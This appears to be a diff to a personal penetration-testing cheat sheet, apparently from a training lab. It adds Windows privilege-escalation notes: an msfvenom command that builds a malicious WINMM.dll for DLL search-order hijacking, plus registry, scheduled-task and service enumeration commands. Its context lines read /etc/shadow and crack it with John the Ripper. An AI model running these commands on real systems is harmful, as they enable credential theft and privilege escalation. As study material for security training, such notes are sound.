@@ -535,12 +535,36 @@ cat /etc/shadow
 john --wordlist=Mywordlist.txt shadowfile
 
 
+-------------------------------------------------------------------------------------------------------------------------------------------------
+WINDOWS EXPLOITATION:
+    net use * \\live.sysinternals.com\tools
 
+  DLL Search Order:
+   Hijacking:
+    reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
+    if DLL is not found: checks current directory from where program ran from; C:\windows\system32, C:\windows
+  
+    msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\Student\\Desktop\\whoami.txt' -f dll > WINMM.dll
+                                                                                                          ^^dll we want to exploit
+  
+  
+  
+  Checking UAC Settings:
+   reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
 
-
-
-
-
+  Vulnerable Scheduled Tasks:
+   schtasks /query /fo LIST /v | Select-String - Pattern "Task" -Pattern "COM handler" -NotMatch
+   
+  Scheduled Tasks & Services:
+   write perm
+   non-stnd locations
+   unquoted executable paths
+   vulnerabilities in executables
+   perm to run as SYSTEM
+   
+  Vuln Services:
+   wmic service list full
+   sc query
 
 
 
